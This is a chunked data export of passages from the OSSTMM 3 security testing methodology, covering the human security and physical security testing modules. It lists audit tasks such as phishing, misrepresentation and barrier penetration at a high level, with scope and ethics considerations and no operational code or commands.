    "text": "to and within the target. controls in terms of black and white list quarantines. The mapping and measurement of the Determine the effectiveness of impact of misuse of subjugation authorization on authentication, controls, credentials, and privileges or indemnification, and subjugation D.15 Privileges Audit the unauthorized escalation of controls in terms of depth and roles. privilege. The determination and measurement Determine the effectiveness of of the resilience of the target to continuity and resilience controls Survivability Validation / excessive or adverse changes where through the verification of denial of D.16 Service Continuity continuity and resilience controls service and denial of interactivity. would be impacted. A review of audit activities performed Know what parts of the audit left a with the true depth of those activities usable and reliable trail. Alert and Log Review / D.17 as recorded by the target or from a End Survey third-party as in the control of alarm. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 102\\n6.3 One Methodology Putting all the modules together provides one methodology to know and work with. This is one methodology which is applicable to any and all types of security tests. Whether the target be a particular system, a location, a person, a process, or thousands of them, this one methodology will assure the most thorough and efficient test possible. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 103\\nIn roulette you need to bet on the person spinning the wheel and throwing the ball. Like any other human they get bored and fall into a routine. Exploit the person whose predictability has inevitably better odds than the machine. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 104\\nChapter 7 - Human Security Testing Human Security (HUMSEC) is a subsection of PHYSSEC and includes Psychological Operations (PSYOPS). Testing this channel requires interaction with people in gatekeeper positions of assets. This channel covers the involvement of people, primarily the operating personnel within the target scope or framework. While some services consider this simply as “social engineering”, the true compliance objective of security testing in this channel is personnel security awareness testing and gap measurement to the required security standard outlined in company policy, industry regulations, or regional legislation. The Analyst will be required to have multiple tools and methods for the completion of some tasks to assure that suspicion is not raised among personnel and tests are not made invalid due to an early discovery or heightened paranoia. It may also be pertinent to limit test subjects to one per department or other boundary. Competent Analysts will require both diligent people skills and critical thinking skills to assure factual data collection creates factual results through correlation and analysis. Considerations Please note the following considerations to assure a safe, high quality test: 1. In personam: Scope restrictions target those personnel who are under direct legal contract with the scope owner and, therefore, have legal responsibility for their security awareness and obligations. 2. Plausible deniability: No direct personnel security testing will take place for personnel who",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 83
    }
  },
  {
    "text": "to assure a safe, high quality test: 1. In personam: Scope restrictions target those personnel who are under direct legal contract with the scope owner and, therefore, have legal responsibility for their security awareness and obligations. 2. Plausible deniability: No direct personnel security testing will take place for personnel who have not been trained, informed, or can be said to possess security awareness experience or obligations due to job responsibility requirements. 3. Human rights: Where personnel to be tested are randomly chosen or are not said to have job responsibilities directly related to gate keeping, security, or safety, the Analyst will refrain from personally identifying the person and report solely on a statistical basis. 4. Incommunicado: Personnel given time will discuss the actions of the test with others and alter the course of the testing. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 105\\n7.1 Posture Review Initial studies of the posture includes the laws, ethics, policies, industry regulations, and political culture which influence the security and privacy requirements for the scope. This review forms a matrix to which testing should be mapped but not constrained. 7.1.1 Policy Review and document appropriate organizational policy regarding security, integrity, and privacy responsibilities of personnel in the scope. 7.1.2 Legislation and Regulations Review and document appropriate regional and national legislation and industry regulations regarding the security and privacy requirements of the organization in the scope as well as that which includes the appropriate customers, partners, organizational branches, or resellers outside the scope. 7.1.3 Culture Review and document appropriate organizational culture in the scope towards security and privacy awareness, required and available personnel training, organizational hierarchy, and recognized trust interaction between employees. 7.1.4 Relationships Review and document the appropriate influential relationships between personnel from the organizational hierarchy from within the scope. 7.1.5 Regional Culture Review and document the appropriate influence of regional and foreign cultures on social hierarchy in the environment in which the scope resides. 7.1.6 Economics Review and document the appropriate influence of economics and pay scale on social status of personnel from both the vector of personnel within the scope and that of the outside community on which the scope resides. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 106\\n7.2 Logistics Preparation of the channel test environment needed to prevent false positives and false negatives which lead to inaccurate test results. 7.2.1 Communications Equipment Test for communications that provide identification to the receiver such as caller ID, FAX back, IP address logging, locator badges, and e-mail gateway headers. Test whether the identification be blocked, removed, or obfuscated, and to what degree of anonymity. 7.2.2 Communications Test which languages are used within the scope and which languages are communicated between the scope and the customers, partners, and resellers outside the scope. 7.2.3 Time Test for the timezone, holidays, and work schedules for various roles and jobs within the scope including partners, resellers, and influential customers interacting with the scope. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 107\\n7.3 Active Detection Verification Determination of",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 84
    }
  },
  {
    "text": "the customers, partners, and resellers outside the scope. 7.2.3 Time Test for the timezone, holidays, and work schedules for various roles and jobs within the scope including partners, resellers, and influential customers interacting with the scope. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 107\\n7.3 Active Detection Verification Determination of active and passive controls to detect intrusion to filter or deny test attempts must be made prior to testing to mitigate the risk of creating false positives and negatives in the test result data as well as changing the alarm status of monitoring personnel or agents. 7.3.1 Channel Monitoring Test whether help desk or support channels over telephone, instant messaging, chat, web-based forums, or e-mail, are monitored by a third party for quality control. 7.3.2 Channel Moderating Test whether help desk or support channels over telephone, instant messaging, chat, web-based forums, or e-mail, are filtered or quarantined by personnel or automated system to verify for authenticity, strip extraneous data, ignore repeated requests, or moderate interactions. 7.3.3 Supervision Test whether support personnel may answer requests without confirmation from a supervisor or similar personnel. 7.3.4 Operator Assistance Test what access to which personnel via the telecommunications channel must be made through an operator, whether manned by personnel or automated. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 108\\n7.4 Visibility Audit Enumeration and verification tests for the visibility of personnel with which interaction is possible via all channels. 7.4.1 Access Identification Test for channels which provide interactions with personnel from outside the scope and document all methods used and the results of those methods. 7.4.2 Personnel Enumeration Enumerate the number of personnel within the scope with both authorized and unauthorized access to processes within the scope, regardless of time or access channel, and the method for obtaining that data. 7.5 Access Verification Tests for the enumeration of access points to personnel within the scope. While access to personnel outside of the scope is a real scenario and one often used for information property theft, this may be limited to scope-only interaction to protect the independent privacy rights of the personnel in their private life. 7.5.1 Access Process Map and explore the use of channels into the scope to reach assets. Document all methods used and the results of those methods. 7.5.2 Authority Use personnel in positions of authority with access-control or who hold gatekeeper positions to assets within the scope. Document methods used in discovery of key personnel. 7.5.3 Authentication Enumerate and test for inadequacies from gateway personnel and what privileges are required to interact with them to assure that only identifiable, authorized, intended parties are provided access. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 109\\n7.6 Trust Verification Tests for trusts between personnel within the scope where trust refers to access to information or physical assets from other targets within the scope. 7.6.1 Misrepresentation Test and document the depth of requirements for access to assets within the scope with the use of misrepresentation as a member of the “internal” support or delivery",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 85
    }
  },
  {
    "text": "personnel within the scope where trust refers to access to information or physical assets from other targets within the scope. 7.6.1 Misrepresentation Test and document the depth of requirements for access to assets within the scope with the use of misrepresentation as a member of the “internal” support or delivery personnel from within the scope without any credentials. 7.6.2 Fraud Test and document the depth of requirements for access to assets within the scope with the use of fraudulent representation as a member of the management or other key personnel. 7.6.3 Misdirection Test and document the depth of requirements for access to assets within the scope with the use of misrepresentation as a member of support or delivery personnel from outside the scope. 7.6.4 Phishing Test and document the depth of requirements for access to personnel-controlled information or physical assets through all discovered channels to personnel within the scope with the use of a fraudulent gateway where personnel are asked to supply credentials. Document the methods and all credentials collected in this manner. 7.6.5 Resource Abuse Test and document the depth of requirements to take assets outside of the scope to a known and trusted source or throughout the scope itself to other personnel without any established, required credentials. 7.6.6 In Terrorem Test and document the depth of requirements to incite fear, revolt, violence, and chaos, through the disruption of personnel and the use of rumor or other psychological abuse. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 110\\n7.7 Controls Verification Tests to enumerate types of loss controls used to protect the value of assets. 7.7.1 Non-repudiation Enumerate and test for use or inadequacies from gateway personnel to properly identify and log access or interactions to assets for specific evidence to challenge repudiation. Document the depth of the interaction which is recorded. 7.7.2 Confidentiality Enumerate and test for use or inadequacies from all segments of communication with personnel within the scope over a channel or properties transported over a channel using secured lines, encryption, “quieted” or “closed” personal interactions to protect the confidentiality of the information assets known only to those with the proper security clearance classification of that asset. 7.7.3 Privacy Enumerate and test for use of or inadequacies from all segments of communication with personnel within the scope over a channel or properties transported using specific, individual signatures, personal identification, “quieted” or “closed room” personal interactions to protect the privacy of the interaction and the process of providing assets only to those within the proper security clearance for that process, information, or physical assets. 7.7.4 Integrity Enumerate and test for inadequacies in all segments of communication with personnel within the scope where assets are transported over a channel using a documented process, signatures, encryption, hash, or markings to protect and assure that the information or physical assets cannot be changed, switched, redirected, or reversed without it being known to parties involved. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 111\\n7.8 Process Verification Tests to examine the maintenance of",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 86
    }
  },
  {
    "text": "using a documented process, signatures, encryption, hash, or markings to protect and assure that the information or physical assets cannot be changed, switched, redirected, or reversed without it being known to parties involved. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 111\\n7.8 Process Verification Tests to examine the maintenance of functional security awareness of personnel in established processes and due diligence as defined in the Posture Review. 7.8.1 Maintenance Examine and document the timeliness, appropriateness, access to, and extent of processes for the notification and security awareness of all personnel in regards to operational security, actual security, and loss controls. 7.8.2 Misinformation Determine the extent to which personnel security notifications and security news can be expanded or altered with misinformation. 7.8.3 Due Diligence Map and verify any gaps between practice and requirements as determined in the Posture Review through all channels. 7.8.4 Indemnification Document and enumerate the abuse or circumvention of employee policy, insurance, non- disclosure, non-compete, liability contracts, or use/user disclaimers with all access personnel within the scope over all channels. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 112\\n7.9 Training Verification Tests to examine the ability to circumvent or disrupt functional security awareness education and training in gateway personnel. 7.9.1 Education Mapping Map types and frequency of security awareness assistance, education courses, and training provided to personnel, partners, customers, and specifically to gatekeepers. 7.9.2 Policy Disruption Discover and examine the process and depth of self-policing from personnel for the disruption or non-conformity of security policy. 7.9.3 Awareness Mapping Map the limitations discovered in security awareness training for personnel through gap analysis with actual procedures, including but not limited to: the provision of assets via any channel, the ability to recognize improper and forged identification or required methods, the method of proper identification among personnel, the use of personal security measures for one’s self and assets, the handling of confidential and sensitive assets, and the conformity to organizational security policy. 7.9.4 Awareness Hijacking Discover and examine the extent to which a non-official person provides misinformation regarding security policy in an authoritative manner to purposely circumvent or break security policy. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 113\\n7.10 Property Validation Tests to examine information and physical property available within the scope or provided by personnel which may be illegal or unethical. 7.10.1 Sharing Verify the extent to which individually licensed, private, faked, reproduced, non-free, or non-open property is shared between personnel either intentionally through shared processes and programs, libraries, and personal caches or unintentionally through mismanagement of licenses and resources, or negligence. 7.10.2 Black Market Verify the extent to which individually licensed, private, faked, reproduced, non-free, or non-open property is promoted, marketed, or sold between personnel or by the organization. 7.10.3 Sales Channels Verify public, out of scope businesses, auctions, or property sales which provide contact information through channels originating within the scope. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 114\\n7.11 Segregation Review Tests for appropriate separation of private or personal information assets from business information. Like a",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 87
    }
  },
  {
    "text": "organization. 7.10.3 Sales Channels Verify public, out of scope businesses, auctions, or property sales which provide contact information through channels originating within the scope. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 114\\n7.11 Segregation Review Tests for appropriate separation of private or personal information assets from business information. Like a privacy review, it is the focal point of the legal and ethical storage, transmission, and control of personnel, partner, and customer private information. 7.11.1 Privacy Containment Mapping Map gatekeepers of private information assets within the scope, what information is stored, how and where the information is stored, and over which channels the information is communicated. 7.11.2 Evident Information Enumerate and map information regarding individual gateway personne. such as names, race, sex, religion, vacation days, personal web pages, published resumes, personal affiliations, directory inquiries, bank branch(es), electoral register, and any particular personal information stated implicitly as private in regulations and policy. 7.11.3 Disclosure Examine and document types of disclosures of private information assets on personnel from gatekeepers responsible for this segregation according to policy and regulations as determined in the Posture Review and the basic human right to privacy. 7.11.4 Limitations Examine and document types of gateways and channel alternatives with gateways accessible to people with physical limitations within that channel. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 115\\n7.12 Exposure Verification Tests for uncovering information which provides for or leads to authenticated access or allows for unintended access to multiple locations with the same authentication. 7.12.1 Exposure Mapping Enumerate and map personnel information regarding the organization such as organization charts, key personnel titles, job descriptions, personal and work telephone numbers, mobile phone numbers, business cards, shared documents, resumes, organizational affiliations, private and public e-mail addresses, log-ins, log-in schemes, passwords, back-up methods, insurers, or any particular organizational information stated implicitly as confidential in regulations and policy. 7.12.2 Profiling Profile and verify the organization, employee skill requirement types, pay scales, channel and gateway information, technologies, and direction. 7.13 Competitive Intelligence Scouting Tests for scavenging property that can be analyzed as business intelligence. While competitive intelligence as a field is related to marketing, the process here includes any form of competitive intelligence gathering, including but not limited to economic and industrial espionage. 7.13.1 Business Grinding Map gatekeepers of business assets within the scope, what information is stored, how and where the information is stored, and over which channels the information is communicated between personnel. 7.13.2 Business Environment Explore and document from individual gateway personnel business details such as alliances, partners, major customers, vendors, distributors, investors, business relations, production, development, product information, strategic planning, stocks and trading, and any particular business information or property stated implicitly as confidential in regulations and policy. 7.13.3 Organizational Environment Examine and document types of disclosures of business assets from gatekeepers on operations, processes, hierarchy, financial reporting, investment opportunities, mergers, acquisitions, channel investments, channel maintenance, internal social politics, personnel dissatisfaction and turn-over rate, primary vacation times, hirings, firings, and any particular organizational assets stated implicitly as confidential in regulations",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 88
    }
  },
  {
    "text": "Environment Examine and document types of disclosures of business assets from gatekeepers on operations, processes, hierarchy, financial reporting, investment opportunities, mergers, acquisitions, channel investments, channel maintenance, internal social politics, personnel dissatisfaction and turn-over rate, primary vacation times, hirings, firings, and any particular organizational assets stated implicitly as confidential in regulations and policy. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 116\\n7.14 Quarantine Verification Tests for verifying the proper fielding and containment of aggressive or hostile contacts at the gateway points. 7.14.1 Containment Process Identification Identify and examine quarantine methods and process at the gateways in all channels for aggressive and hostile contacts such as sales people, head-hunters, grifters, journalists, competitors, job seekers, job candidates, and disruptive persons. 7.14.2 Containment Levels Verify the state of containment, length of time, and all channels where interaction with gatekeepers has quarantine methods. Ensure that methods are within legal context and boundaries. 7.15 Privileges Audit Tests where credentials are supplied to the user and permission is granted for testing with those credentials. 7.15.1 Identification Examine and document the process for obtaining identification through both legitimate and fraudulent means on all channels. 7.15.2 Authorization Verify the use of fraudulent authorization on all channels to gain privileges similar to that of other personnel. 7.15.3 Escalation Verify and map access to assets through the use of privileges to gain higher or more extensive privileges beyond that which is authoritatively designated to the role. 7.15.4 Discrimination Verify information requested and privileges granted from gatekeepers in cases where age (specifically those who are legally minors for the region), sex, race, custom/culture, and religion are factors which may be discriminated against in accordance to the Posture Review. 7.15.5 Subjugation Enumerate and test for inadequacies of assets communicated over channels where those controls are not required, can be circumvented or ignored such as insecure e-mail or over a public telephone line. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 117\\n7.16 Service Continuity Determining and measuring the resilience of the gatekeepers within the scope to excessive or hostile changes designed to cause service failure. 7.16.1 Resilience Enumerate and test for inadequacies on all channels from personnel within the scope whereby removing or quieting gateway personnel will allow for direct access to assets. 7.16.2 Continuity Enumerate and test for inadequacies from all personnel with regard to access delays and service response time through back-up personnel or automated means for access to alternate gateway personnel. 7.16.3 Safety Map and document the process of gatekeepers disconnecting channels due to evacuation or safety concerns as a gap analysis with regulation and security policy. 7.17 End Survey A gap analysis between activities performed with the test and the true depth of those activities as recorded or from third-party perceptions both human and mechanical. 7.17.1 Alarm Verify and enumerate the use of a localized or scope-wide warning system, log, or message for each access gateway over each channel where a suspect situation is noted by personnel upon suspicion of circumvention attempts, social engineering, or fraudulent activity. 7.17.2 Storage and",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 89
    }
  },
  {
    "text": "perceptions both human and mechanical. 7.17.1 Alarm Verify and enumerate the use of a localized or scope-wide warning system, log, or message for each access gateway over each channel where a suspect situation is noted by personnel upon suspicion of circumvention attempts, social engineering, or fraudulent activity. 7.17.2 Storage and Retrieval Document and verify the privileged and efficient access to alarm, log, and notification storage locations and property. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 118\\nThe most useless types of physical security controls are the kinds that don’t protect against what you need them to and those which protect against anything for no reason. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 119\\nChapter 8 - Physical Security Testing PHYSSEC (Physical Security) is a classification for the material security within the physical realm which is within the limits of human-interactive 3D space. Testing this channel requires non-communicative interaction with barriers and humans in gatekeeper positions of assets. This channel covers the interaction of the Analyst within proximity of the targets. While some services consider this simply as “breaking and entering”, the true compliance objective of security testing in this channel is physical and logical barrier testing and gap measurement to the required security standard as outlined in company policy, industry regulations, or regional legislation. The Analyst will be required to have multiple tools and methods for the completion of some tasks to assure that suspicion is not raised among personnel and tests are not made invalid due to an early discovery or heightened paranoia. It may also be pertinent to limit test subjects to one per department or other boundary. Analysts will also need to be prepared for the possibility of accidental bodily harm from conventional barriers and weapons, interactions with animals, subjection to harmful bacteria, viruses, and fungi, exposure to electromagnetic and microwave radiation, especially that which can permanently damage hearing or sight, and poisonous or corrosive chemical agents in any form. Competent Analysts will require physical strength, endurance, agility, and critical thinking skills to assure factual data collection creates factual results through correlation and analysis. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 120\\nConsiderations Please note the following considerations to assure a safe, high quality test: 1. Conatus: All attempts to traverse physical barriers require an unbiased judgment of the amount of difficulty required to reach and interact with the target and the danger involved. These considerations are to be made with regard to the “will to live” of humans as well as any effect on the targets should the attack be made without regard for life (suicidal). 2. Ecce hora: All physical tests require close attention be made to time. Records must be kept of the time the test is made, time on target, and time the test finishes, whether successful or not, because that will also assist in determining what can be accomplished within the time range to fail. Knowing such information can help understand what may be a deceptive attack so as to be sure",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 90
    }
  },
  {
    "text": "the test is made, time on target, and time the test finishes, whether successful or not, because that will also assist in determining what can be accomplished within the time range to fail. Knowing such information can help understand what may be a deceptive attack so as to be sure resources are not wasted in one area while leaving another open. 3. Abuse of discretion: The Analyst must take care not to ignore or misinterpret the results from testing a physical barrier or obstacle because it is not within the range of the Analyst’s physical possibilities. The Analyst should remain unbiased and not over-estimate or over-value personal skills and ability and instead apply the tests as a highly skilled and highly able person could. 4. Magister pecuarius: The Analyst should not dismiss the reasonable potential of an attacker using trained animals to circumvent barriers and obstacles where a human being cannot. 5. Plausible deniability: No direct or physical personnel security testing will take place for personnel who have not been trained, informed, or can be said to possess security awareness experience or obligations due to job responsibility requirements. 6. Sui generis: All interaction with physical barriers will leave record of this interactivity and, in more extreme cases, may weaken or destroy the barrier. The Analyst should take care in testing one-of- a-kind type targets which may not be replaceable. The Analyst should also take care not to leave permanent markings wherever possible and to keep record of all barriers tested to verify them for damage after the audit. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 121\\n8.1 Posture Review Initial studies of the posture includes the laws, ethics, policies, industry regulations, and political culture which influence the security and privacy requirements for the scope. This review forms a matrix to which testing should be mapped but not constrained. 8.1.1 Policy Review and document appropriate organizational policy regarding security, safety, integrity (i.e. supply chain), and privacy requirements for barriers in the scope. 8.1.2 Legislation and Regulations Review and document appropriate regional and national legislation and industry regulations regarding the security and privacy requirements of the organization in the scope as well as that which includes the appropriate customers, partners, organizational branches, or resellers outside the scope. 8.1.3 Culture Review and document appropriate organizational culture in the scope towards security and privacy awareness, required and available personnel training, organizational hierarchy, and recognized trust interaction between employees. 8.1.4 Relationships Review and document the appropriate influential relationships between personnel from the organizational hierarchy from within the scope. 8.1.5 Regional Culture Review and document the appropriate influence of regional and foreign cultures on safety, social hierarchy, the supply chain, and services in the environment in which the scope resides. 8.1.6 Economics Review and document the appropriate influence of economics and pay scale on social status and criminal intent on personnel from both the vector of personnel within the scope and that of the outside community in which the scope resides. 8.1.7 Environment Review for the",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 91
    }
  },
  {
    "text": "which the scope resides. 8.1.6 Economics Review and document the appropriate influence of economics and pay scale on social status and criminal intent on personnel from both the vector of personnel within the scope and that of the outside community in which the scope resides. 8.1.7 Environment Review for the target region the weather patterns, dangerous weather extremes (i.e. flooding, tornadoes, hurricanes), temperature extremes, humidity maximums, air quality, tectonic stability, typical fauna, forms of natural or man-made disaster and general insect infestation. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 122\\n8.2 Logistics Preparation of the channel test environment needed to prevent false positives and false negatives which lead to inaccurate test results. 8.2.1 Environment (a) Examine the scope to determine if any special equipment is required for the environment of the targets. Equipment can range from rope to climb walls to SCUBA gear to travel under water. Equipment types are not limited to just the environment but also the barriers one must circumvent. (b) Verify damaged safety equipment which may lead to Analyst injury. (c) Examine the targets for hazardous, contaminated, or poorly maintained terrain, air, water, buildings, or structures. (d) Examine noise, electromagnetic radiation, and magnetic field levels at the scope. 8.2.2 Communications (a) Test which languages are used within the scope and which languages are communicated between the scope and the customers, partners, and resellers outside the scope. (b) Examine the means of communication between personnel and whether it is enhanced through the use of tools such as flags, flares, radios, binoculars, night vision, etc. 8.2.3 Time (a) Test for the timezone, holidays, and work schedules for various roles and jobs within the scope including partners, resellers, and influential customers interacting with the scope. (b) Determine if decreased mobility or visibility during time of day, week, month, or season (day or night, fog, rain, or snow) will have an impact upon operations at the target. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 123\\n8.3 Active Detection Verification Determination of active and passive controls to detect intrusion to filter or deny test attempts must be made prior to testing to mitigate the risk of creating false positives and negatives in the test result data as well as changing the alarm status of monitoring personnel or agents. 8.3.1 Monitoring (a) Verify that the scope is monitored by a third party for intrusion via look-outs, guards, cameras, or sensors. The date and time of entry as well as departure of the target should be recorded. (b) Determine the range of the monitoring and whether the travel of a threat to the target can be intercepted in a timely manner. (c) Verify if travel to the target requires increased time on target and exposure. This includes, but is not limited to: quarantine rooms, long empty hallways, parking lots, large empty expanses, difficult or unnatural terrain, and guest or holding areas. (d) Verify that the lighting and visible contrast on approach to the target allows for interception of threats. 8.3.2 Reacting (a) Verify",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 92
    }
  },
  {
    "text": "and exposure. This includes, but is not limited to: quarantine rooms, long empty hallways, parking lots, large empty expanses, difficult or unnatural terrain, and guest or holding areas. (d) Verify that the lighting and visible contrast on approach to the target allows for interception of threats. 8.3.2 Reacting (a) Verify if interactive controls for the target will react timely to extreme environmental conditions according to the Environment review task of the Posture Review. (b) Verify if the target will react timely to a disturbance in air, water, and soil quality. (c) Verify if the target will react timely to critical noise disturbances. (d) Verify if the target will react timely to magnetic field disturbances. (e) Verify if the target will react timely to fires. (f) Verify if the target will react timely to denial of target access via blockade or quarantine. (g) Verify if the target will react timely to threats of fear, revolt, or violence within the scope. (h) Determine the finality of threat interception. 8.4 Visibility Audit Enumeration and verification tests for the visibility of targets and assets. In PHYSSEC, assets must also include supplies such as food, water, fuel, etc. and operational processes which may affect those supplies like the proper removal of waste and other contaminants, loading and unloading supply shipments, sleep and rest cycles, proper acclimatization, etc. 8.4.1 Reconnaissance (a) Map and detail the scope perimeter determined by visible and assisted viewing techniques, publicly accessible areas, public plans, and public sources. (b) Enumerate and detail targets and assets visible from outside the scope. (c) Enumerate and detail target traffic patterns, foot traffic, occupied areas, and sensors visible outside the scope. (d) Enumerate directories and internal telephone books identifying locations of sensitive information processing facilities that are not readily accessible by the public. (e) Map and enumerate the physical location and layout of the targets, the size and navigability of obstacles, barriers, and hazards which will increase time on target. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 124\\n8.5 Access Verification Tests for the enumeration of access points to interact with the targets and assets within the scope. While access to walls and fences bordering property outside of the scope is a real scenario and one often used in an attack, this audit is limited to scope-only interaction to protect the property rights of third parties. 8.5.1 Enumeration (a) Map and explore the navigable of terrain, barriers, and obstacles into the scope to reach the targets and assets. Document all methods used and the results of those methods. (b) Map and verify all access points that allow stealthy or unmonitored, direct (3 seconds or less time on target) interaction with the target. (c) Verify the size and navigable of public and private access points and all paths to target. 8.5.2 Authentication (a) Enumerate and test for inadequacies which privileges are required to access, the process of obtaining those privileges, and assure that only identifiable, authorized, intended parties are provided access. (b) Verify the process of authenticating",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 93
    }
  },
  {
    "text": "and navigable of public and private access points and all paths to target. 8.5.2 Authentication (a) Enumerate and test for inadequacies which privileges are required to access, the process of obtaining those privileges, and assure that only identifiable, authorized, intended parties are provided access. (b) Verify the process of authenticating which items may be taken into the scope by both authorized and unauthorized personnel. (c) Verify the process of authenticating which items may be taken out of the scope by both authorized and unauthorized personnel. (d) Verify the process of recording access and which items were entered and removed. 8.5.3 Location (a) Map the distance from the scope perimeter to the visible targets and assets from outside the scope. (b) Map and identify all paths to access points which can be reached in a noisy, not stealthy, direct (3 seconds or less time on target) interaction with that access point. This may include attacks which are sans conatus (without regard for the attacker’s life). 8.5.4 Penetration (a) Determine which barriers and obstacles in the scope provide remote access to change, disrupt, destroy, or obtain assets (visually, aurally, and magnetically). (b) Determine the effectiveness of barriers and obstacles to withstand conditions defined in the Posture Review. (c) Determine and rate the effectiveness of barriers and obstacles to withstand fire, explosions, and general concussive forces such as gunshots and vehicular ramming. (d) Determine and rate the effectiveness of barriers and obstacles to reduce incoming: critical noise levels, heat, cold, smoke, humidity, disruptive or caustic odors, intense magnetic fields, harmful light, and pollutants. (e) Determine and rate the effectiveness of barriers and obstacles to reduce outgoing: sounds, smells, vibrations, conditions for acclimatization, smoke, magnetic fields, waste, and pollutants. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 125\\n8.6 Trust Verification Tests for trusts between processes within the scope where trust refers to access to assets without the need for identification or authentication. 8.6.1 Misrepresentation (a) Test and document the depth of requirements for access to assets with the use of misrepresentation as a member of the “internal” support or delivery personnel without proper credentials. (b) Test and document the depth of requirements for access to assets with the use of misrepresentation as a disabled person. 8.6.2 Fraud Test and document the depth of requirements for access to assets with the use of fraudulent representation of authority as a member of the management or other key personnel. 8.6.3 Misdirection Test and document the depth of requirements for access to assets with the use of misrepresentation as a member of support or delivery personnel outside the scope. 8.6.4 Stowage Test and document the depth of requirements for access to assets through stealthy stowage with a transport of support or delivery to take the stowage outside the scope. 8.6.5 Embezzlement Test and document the depth of requirements to hide assets within the scope (whole or destroyed), take assets outside of the scope to a known and trusted source, and throughout the scope itself to other personnel without",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 94
    }
  },
  {
    "text": "of support or delivery to take the stowage outside the scope. 8.6.5 Embezzlement Test and document the depth of requirements to hide assets within the scope (whole or destroyed), take assets outside of the scope to a known and trusted source, and throughout the scope itself to other personnel without any established, required credentials. 8.6.6 In Terrorem Test and document the depth of requirements to incite fear, revolt, violence, and chaos, through the disruption of processes and the contamination of supplies. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 126\\n8.7 Controls Verification Tests to enumerate types of loss controls used to protect the value of assets. 8.7.1 Non-repudiation Enumerate and test for use or inadequacies from monitors and sensors to properly identify and log access or interactions with assets for specific evidence to challenge repudiation. Document the depth of the interaction which is recorded. 8.7.2 Confidentiality Enumerate and test for use or inadequacies from all signals, physical communication, and transported items between both internal and external-reaching processes and personnel using codes, undecipherable language, “quieted” or “closed” personal interactions to promote the confidentiality of the communication only to those with the proper security clearance classification for that communication. 8.7.3 Privacy Enumerate and test for use of or inadequacies from all interactions within the scope using unmarked or non-obvious packaging or labeling, “quieted” or “closed room” interactions, and within randomly chosen quarters to hide or protect the privacy of the interaction and only to those with the proper security clearance for that process or asset. 8.7.4 Integrity (a) Enumerate and test for inadequacies in all signals and communication between processes and personnel using a documented process, seals, signatures, hashing, or encrypted markings to protect and assure that the assets cannot be changed, redirected, or reversed without it being known to the parties involved. (b) Enumerate and test for inadequacies in all processes and interactions with assets in transport which use a documented process, signatures, seals, break-away tape, brands, tags, sensors, or encrypted markings to protect and assure that the assets cannot be changed, redirected, or reversed without it being known to the parties involved. (c) Verify all storage mediums for information are not in danger from unnatural decay such as heat or humidity damage, fading from direct sunlight, or magnetic degradation (bit rot). Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 127\\n8.8 Process Verification Tests to examine the maintenance of functional security operations in established processes and 